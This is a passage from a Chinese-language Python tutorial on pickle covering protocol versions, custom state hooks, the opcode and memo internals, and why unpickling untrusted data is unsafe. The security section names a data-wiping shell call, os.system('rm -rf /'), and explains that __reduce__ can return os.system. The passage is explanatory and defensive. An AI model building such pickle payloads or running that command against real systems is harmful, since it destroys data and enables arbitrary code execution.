在跨 Python 版本部署时，写文件用的 protocol 要选目标环境都支持的版本。比如部署环境含 Python 3.7，就不能用 protocol 5（3.8 才支持）。

```python
import pickle

# 推荐：显式指定一个所有目标版本都支持的协议
PICKLE_PROTOCOL = 2   # Python 2.3+ 通用，安全保守

with open("/tmp/state.pkl", "wb") as f:
    pickle.dump(big_obj, f, protocol=PICKLE_PROTOCOL)
```

**用 HIGHEST_PROTOCOL 追求性能**

在同构、可控的 Python 环境内部（比如自家的缓存集群），用 `pickle.HIGHEST_PROTOCOL` 享受最高效率：

```python
import pickle
pickle.dump(obj, f, protocol=pickle.HIGHEST_PROTOCOL)
```

**文件一定用二进制模式**

这条规则前面强调过，再重申一次：

```python
# 错误：pickle.dump(obj, open("x.pkl", "w"))   文本模式会报错
# 正确：
with open("x.pkl", "wb") as f:
    pickle.dump(obj, f)
with open("x.pkl", "rb") as f:
    obj = pickle.load(f)
```

**自定义类实现 __getstate__ 处理不可序列化资源**

任何持有文件句柄、数据库连接、网络 socket、线程锁的对象，都必须实现 `__getstate__` 剔除这些资源，否则序列化会抛错或产生无效状态。

```python
class Service:
    def __init__(self, endpoint):
        self.endpoint = endpoint
        self._conn = self._connect(endpoint)   # 连接对象不可序列化

    def __getstate__(self):
        state = self.__dict__.copy()
        state.pop("_conn", None)               # 剔除连接
        return state

    def __setstate__(self, state):
        self.__dict__.update(state)
        self._conn = self._connect(self.endpoint)  # 反序列化时重连
```

**对 `__slots__` 对象的序列化**

`__slots__` 对象没有 `__dict__`，默认 pickle 行为可能丢失槽属性。实现 `__getstate__` / `__setstate__` 手动处理：

```python
class Slotted:
    __slots__ = ("x", "y")

    def __init__(self, x, y):
        self.x = x
        self.y = y

    def __getstate__(self):
        return {"x": self.x, "y": self.y}

    def __setstate__(self, state):
        self.x = state["x"]
        self.y = state["y"]
```

**版本兼容性注意**

低版本 Python 无法读取高 protocol 字节流。具体：

- protocol 0~2：Python 2.3+ / 3.x 通用。
- protocol 3：Python 3.0+。
- protocol 4：Python 3.4+。
- protocol 5：Python 3.8+。

部署环境多元时，选最低共同版本作为持久化格式，避免"用 3.8 写的缓存文件在 3.7 环境读不了"。

**不要用 pickle 做配置文件**

配置文件应该可读、可手编、可被其他工具处理——用 YAML、TOML、JSON。pickle 是二进制、不可读、不安全的，完全不适合做配置。

**异常处理：EOFError 与数据损坏**

读取流式 pickle 文件时用 `EOFError` 判断结束；遇到损坏数据时会抛 `pickle.UnpicklingError`，应包装 try-except：

```python
import pickle

records = []
with open("/tmp/stream.pkl", "rb") as f:
    while True:
        try:
            records.append(pickle.load(f))
        except EOFError:
            break
        except pickle.UnpicklingError as e:
            print(f"跳过损坏记录: {e}")
            break
```

## 4. 原理

### 4.1 pickle 字节流是 opcode 指令序列

理解 pickle 的关键是：**pickle 字节流不是"对象的数据"，而是"如何重建对象的程序"**。前者只描述状态，后者描述过程。`loads` 不是把数据填进模板，而是执行一段由 opcode（操作码）组成的"字节码程序"，每条 opcode 指示解释器做一件具体的事：压栈、调用、赋值、结束。这个执行模型与 Python 自己的字节码（`dis` 模块能看到的那种）在思想上是一致的——都是"用指令描述计算过程"。

pickle 字节流的整体结构是：开头一个协议版本声明（PROTO opcode），可选的帧长度声明（FRAME），然后是一串操作指令，最后以 STOP 结束。`loads` 维护一个"栈"和一个"记忆区"（memo），逐条读取 opcode 并执行：

- 把常量（数字、字符串、None）压入栈。
- 把容器（list、dict）创建出来压栈，再用指令把元素加进去。
- 遇到引用同一对象时，用 memo 机制存取。
- 遇到 REDUCE 指令时，从栈弹出可调用对象和参数，执行调用，把结果压栈。
- 遇到 STOP 时，栈顶就是最终反序列化的对象。

用一个简单例子直观展示：

```python
import pickle
import pickletools

# 序列化一个简单列表 [1, "a"]
raw = pickle.dumps([1, "a"], protocol=2)
pickletools.dis(raw)
# 输出（简化注释）：
#     0: \x80 PROTO 2              声明协议版本
#     2: ]    EMPTY_LIST           压入空 list
#     3: q    BINPUT 0             把栈顶（空 list）记到 memo 0
#     5: (    MARK                 标记栈上一个位置
#     6: K\x01 SHORT_BININT 1      压入整数 1
#     8: U\x01 SHORT_BINSTRING 'a' 压入字符串 'a'    （3.x 用 BINUNICODE）
#    11: e    APPENDS              从 MARK 到栈顶的元素批量 append 到 memo 0
#    12: .    STOP                 结束，栈顶即结果
```

可以看到"序列化一个列表"被拆成了"建空列表 → 记入 memo → 压入元素 → 批量 append → 结束"一串指令。`loads` 的工作就是把这串指令按顺序执行下来，最终栈上留下一个 `[1, 'a']`。这就是"指令式重建"的味道。

### 4.2 memo 机制：如何支持共享引用与循环引用

第一节演示过 pickle 能完整保存循环引用和共享引用，这里展开原理。pickle 字节流里维护一个名为 memo 的"记忆区"：一个从整数编号到对象的映射。工作机制：

- `MEMOIZE` opcode：把当前栈顶对象存入 memo 的下一个编号。
- `BINPUT` / `LONG_BINPUT`：显式指定编号存入。
- `BINGET` / `LONG_BINGET`：按编号从 memo 取出对象压栈。

序列化时，pickler（序列化器）维护一个 `id → memo编号` 的映射。每次遇到一个对象，先按 `id` 查表：

- 没见过：正常序列化对象，序列化完后用 `MEMOIZE` 把它记入 memo。
- 见过：不发完整内容，只发一条 `BINGET 编号` 指令，让 unpickler 从 memo 取出同一个对象。

这样，共享引用天然只剩一条"取编号 N"指令；循环引用也因为是第二次遇到同一对象而走 GET 路径——而彼时 memo 里那个对象已经创建好（虽然还在被填充中），取出来就是同一个引用，循环就重建了。Python 对象在循环引用时不会"还没建好"——因为 `id()` 在对象创建的瞬间就有效，memo 里存的是对象本身不是它的完整状态。

```python
import pickle
import pickletools

# 共享一个内部列表
inner = []
container = [inner, inner]   # 两个位置同一个对象
raw = pickle.dumps(container, protocol=2)
# 能在 dis 输出里看到 MEMOIZE + BINGET 的配合
pickletools.dis(raw)
# 输出（关键片段）：
#  ... EMPTY_LIST           建 inner 空 list
#  ... MEMOIZE  (0)         存入 memo 0
#  ... EMPTY_LIST           建 container
#  ... MEMOIZE  (1)         存入 memo 1
#  ... BINGET 0             取 memo 0（同一个 inner）放进 container
#  ... BINGET 0             再取 memo 0 放进 container
#  ... APPENDS / STOP
```

正是 memo 机制让 pickle 能处理任意对象图，包括 `json` 处理不了的循环和共享引用——后者只能线性输出值，无法表达"这里指向前面那个对象"。

### 4.3 REDUCE 与 __reduce__：为什么能反序列化任意类

pickle 能反序列化任意自定义类实例，原理在于：**反序列化一个对象 = 调用某个可调用对象产生初值 + 填充状态**。这个"调用某个可调用对象"的能力，由 REDUCE opcode 提供，它的语义是"弹出栈顶的可调用对象和参数元组，执行 `callable(*args)`，把结果压栈"。这正是任意类实例重建的基础——只要让"可调用对象"是这个类，就能产生实例。

对普通自定义类，pickle 默认的重建流程是：

1. 通过 `GLOBAL` / `STACK_GLOBAL` opcode 定位到类（比如 `__main__.User`）——这相当于执行 `import` 并 `getattr` 获取类对象。
2. 调用类的 `__new__` 创建空实例（不经过 `__init__`）。
3. 通过 `BUILD` opcode 把状态（`__dict__` 或 `__getstate__` 返回值）注入实例——若对象实现了 `__setstate__` 就调用它，否则直接更新 `__dict__`。

`__reduce__` 是开发者能介入这个流程的钩子。它返回一个元组，元组的第一个元素是"可调用对象"，pickle 在反序列化时通过 REDUCE 调用它产生实例。默认情况下自定义类的 `__reduce__` 返回 `(copyreg.__newobj__, (类,) + 构造参数)` 这种结构，等价于"`__new__` 这个类再填充"。但开发者可以让 `__reduce__` 返回任何可调用对象——包括 `os.system`。这就是 pickle 既能重建任意类、又天生不安全的同一根源：**协议允许调用任意可调用对象，因此既是"万能"的来源，也是"危险"的来源**。

```python
import pickle
import pickletools

# 自定义类的正常 __reduce__
class Point:
    def __init__(self, x, y):
        self.x, self.y = x, y
    def __reduce__(self):
        # 返回 ( callable, args ) —— pickle 用 callable(*args) 重建
        return (Point, (self.x, self.y))

raw = pickle.dumps(Point(3, 4))
pickletools.dis(raw)
# 输出（关键片段）：
#  ... GLOBAL '__main__ Point'   定位类（在反序列化时 import 并 getattr）
#  ... 压入参数 3, 4
#  ... REDUCE                    调用 Point(3, 4) 重建实例
#  ... STOP
```

`GLOBAL` 操作码在反序列化时会执行 `import 模块` 并 `getattr(模块, 名字)`。这是 pickle 能"找回类"的机制，也是"找回 os.system"的机制——`os.system` 不过是模块 `os` 上的一个属性，`GLOBAL 'os' 'system'` 就能取到它。pickle 协议层面无法区分这是类还是普通函数。

### 4.4 protocol 版本演进

pickle 协议不是一成不变的格式，而是随 Python 发展不断新增版本，每个版本在字节流编码上做了优化或扩展。理解版本演进有助于理解"为什么高 protocol 低版本读不了"——新版本引入了新的 opcode，旧版解释器识别不了。

- **protocol 0**：最早的"文本"协议。opcode 多为可打印 ASCII，便于人工查看，但体积大、速度慢。所有 Python 版本都支持，适合极少数需要文本兼容的场景。
- **protocol 1**：旧二进制协议。引入 BININT、BINFLOAT 等二进制编码 opcode，数字用定长二进制表示，比 0 紧凑得多。
- **protocol 2**：Python 2.3 引入。专为"新式类"（继承 object 的类）设计，引入 PROTO opcode 声明版本、BUILD opcode 注入状态、更高效地处理 `__getstate__`/`__setstate__`。是 Python 2.x 与 3.x 互通的最低推荐版本。
- **protocol 3**：Python 3.0 引入。引入 BINBYTES 系列 opcode，原生支持 `bytes` 对象（之前只能当字符串处理，丢失类型信息）。3.x 之间互通推荐版本。
- **protocol 4**：Python 3.4 引入。引入 FRAME opcode 把字节流分帧，让 unpickler 能高效跳过帧、支持超大对象（突破 4GB 限制）、优化 memo 索引编码。
- **protocol 5**：Python 3.8 引入。引入 `pickle.PickleBuffer` 和 `BYTEARRAY8` opcode，支持序列化时把大块字节数据以"带外"（out-of-band）方式传递，避免内存拷贝，主要用于序列化含大型 buffer 的对象（NumPy 数组等）。

版本兼容性是单向的：**高版本解释器能读所有低 protocol 的字节流，低版本解释器读不了高 protocol 的字节流**。这是因为高 protocol 引入的新 opcode 在低版本解释器看来是未知字节。所以跨版本场景下，protocol 选"所有目标环境都支持的最高版本"。日常单机内部使用则直接 `DEFAULT_PROTOCOL` 或 `HIGHEST_PROTOCOL`。

### 4.5 为何 pickle 不安全而 json 安全

掌握了 opcode 模型后，这一节是把安全红线讲透的关键。两者的差异是本质性的而非程度性的：

**json 是纯数据格式**。JSON 规范只定义了六种值的表示：对象（键值对）、数组、字符串、数字、布尔、null。一个 JSON 文本里无论写什么，解析器都只是把这些数据结构读出来——它不会因为某个字段叫 `os.system` 就去调用 `os.system`。解析 JSON 的过程是"识别字符 → 构造数据结构"，全程不产生函数调用。即便 JSON 里有看上去像指令的字段，那也只是字符串而已，只有应用代码主动 `eval` 它才会变成执行——但那已经不是 json 的责任了。

**pickle 是指令格式**。pickle 字节流由 opcode 组成，其中 `GLOBAL`、`STACK_GLOBAL`、`REDUCE`、`INST`、`BUILD` 等 opcode 的语义本身就是"执行"——查找模块属性、调用可调用对象、调用 `__setstate__`。这些都是真实的 Python 函数调用。pickle 字节流里"调用 `os.system('rm -rf /')`"和"调用 `User(name, age)`"在协议层面没有区别，都是 REDUCE 一条指令。unpickler 无法从字节流判断这个调用"是构造还是攻击"——因为任何可调用对象都可能既是合法的重建器，又是恶意的 payload。

换句话说：**json 解析等于读数据，pickle 解析等于执行数据**。这个本质差异决定了安全策略：json 可以接收任何来源的数据；pickle 只能接收完全可信来源的数据。这不是"看你怎么用"的软警告，而是"格式本身就会执行代码"的硬约束。

值得一提的是，Python 社区曾讨论过引入"受限 unpickler"来拒绝危险 opcode，但最终没有进入标准库——因为很难在通用性和安全性之间找到平衡：要支持任意类的反序列化，就必须允许 REDUCE 类调用；一旦允许调用，就不可能保证不被滥用。所以官方的立场始终是"不要 unpickle 不可信数据"，而不是"用受限 unpickler 安全地处理"。

### 4.6 反序列化的对象身份与状态注入

理解反序列化产生的对象"是什么"，需要看 BUILD 和 `__setstate__` 的协作流程。对一个自定义类实例，完整反序列化过程是：

1. `GLOBAL` / `STACK_GLOBAL` 定位到类对象，压栈。
2. 如有 `__reduce__` 指定的可调用对象与参数，用 REDUCE 调用产生"初值对象"（通常是 `__new__` 出的空实例）；否则默认用 `__new__` 创建空实例。
3. 把"状态"（序列化时 `__getstate__` 的返回值，或默认 `__dict__`）压栈。
4. `BUILD` opcode 触发状态注入：
   - 如果对象有 `__setstate__` 方法，调用 `obj.__setstate__(state)`。
   - 否则把 `state` 当作 `__dict__` 更新进 `obj.__dict__`。
5. 最终栈顶的实例就是反序列化结果。

这解释了几个行为：

- 反序列化**不调用 `__init__`**：实例由 `__new__` 创建，再由 `__setstate__` 填充。所以 `__init__` 里做的参数校验、初始化副作用在反序列化路径上不会执行。如果对象的正确性依赖 `__init__` 的校验，必须在 `__setstate__` 里复刻一遍。
- 反序列化产生**新对象**：和原对象不是同一个 `id`，但内容等价。这就是 `restored is original` 为 `False` 的原因。
- `__getstate__` 返回的可以是任意东西：不一定是 `__dict__`。只要 `__setstate__` 知道怎么消费它，就能存任意结构（比如把状态编码成 tuple 来节省空间）。

```python
import pickle

class Counter:
    """用 __getstate__/__setstate__ 控制序列化全流程"""
    def __init__(self, start=0):
        self.value = start
        print(f"  [__init__] called with start={start}")

    def inc(self):
        self.value += 1

    def __getstate__(self):
        print(f"  [__getstate__] saving value={self.value}")
        return {"value": self.value}

    def __setstate__(self, state):
        print(f"  [__setstate__] restoring value={state['value']}")
        self.value = state["value"]

print("--- 创建对象 ---")
c = Counter(100)
c.inc()
c.inc()
print(f"当前值: {c.value}")   # 输出：当前值: 102

print("--- 序列化 ---")
raw = pickle.dumps(c)
# 输出：  [__getstate__] saving value=102

print("--- 反序列化 ---")
restored = pickle.loads(raw)
# 输出：  [__setstate__] restoring value=102
# 注意：没有 [__init__] 这一行 —— 反序列化确实跳过了 __init__

print(f"还原值: {restored.value}")           # 输出：还原值: 102
print(f"类型一致: {type(restored) is Counter}")  # 输出：类型一致: True
```

这个 demo 清晰演示了 `__getstate__` / `__setstate__` 的调用时机，以及 `__init__` 在反序列化路径上被跳过的关键事实。

## 5. 总结

### 5.1 本文内容要点

- `pickle` 是 Python 的二进制序列化模块，能把几乎所有 Python 对象（含自定义类实例、循环引用、集合、日期等）转换成字节串再完整还原，类型保真。
- 两对核心 API：`dumps(obj)/loads(data)` 操作字节串，`dump(obj, file)/load(file)` 操作文件；文件必须用二进制模式 `'wb'/'rb'`。
- `protocol` 参数控制序列化格式版本：0 文本、2+ 二进制高效、DEFAULT/HIGHEST 为当前推荐；高 protocol 低版本 Python 读不了，跨版本互通选低 protocol。
- 自定义类通过定位信息（模块+类名）+ 状态（默认 `__dict__`）被保存；反序列化环境必须能 import 到同名同模块的类。
- `__getstate__` / `__setstate__` 用于自定义序列化状态：剔除不可序列化资源、重建派生属性、处理 `__slots__` 对象。
- **核心安全红线**：pickle 字节流是 opcode 指令序列，`loads` 执行时其中的 `REDUCE` 等指令会调用任意可调用对象。构造调用 `os.system` 的恶意 pickle 极其简单，unpickle 不可信数据即任意代码执行。**绝对不要 unpickle 不可信来源的数据。**
- `pickletools.dis` 能反汇编字节流用于审计；扫描危险 opcode 只是辅助手段，不是"安全反序列化的方法"。
- 与 json 对比：pickle Python 专属、二进制、不安全、类型全；json 跨语言、文本、安全、类型少。跨语言或不可信来源用 json，自有 Python 内部且需保真对象用 pickle。

### 5.2 读完本文你应能掌握的能力

- 能正确区分 `dumps/loads` 与 `dump/load` 的用法，写出基本的对象序列化/反序列化代码，并知道文件必须用二进制模式。
- 能说明 pickle 能保真的类型范围（含 set/tuple/date/自定义类等），并能解释为什么 json 做不到这些。
- 能说出 `protocol` 各版本的区别、`DEFAULT_PROTOCOL` 与 `HIGHEST_PROTOCOL` 的使用场景，并能在跨版本场景下正确选择 protocol。
- 能为自定义类实现 `__getstate__` / `__setstate__`，正确处理持有文件句柄、连接等不可序列化资源的对象，以及 `__slots__` 对象。
- 能完整复述"pickle 字节流是 opcode 指令序列、loads 会执行 REDUCE 等调用指令"这一原理，并向他人解释为什么 pickle 不安全而 json 安全。
- 能识别并规避对不可信数据使用 `pickle.loads` / `pickle.load` 的危险写法，在工程中坚持"不可信数据走 json / 安全格式，pickle 仅用于本地可信持久化"的取舍原则。
- 能用 `pickletools.dis` 审查 pickle 字节流结构，识别含 `REDUCE + 危险模块名` 的可疑字节流。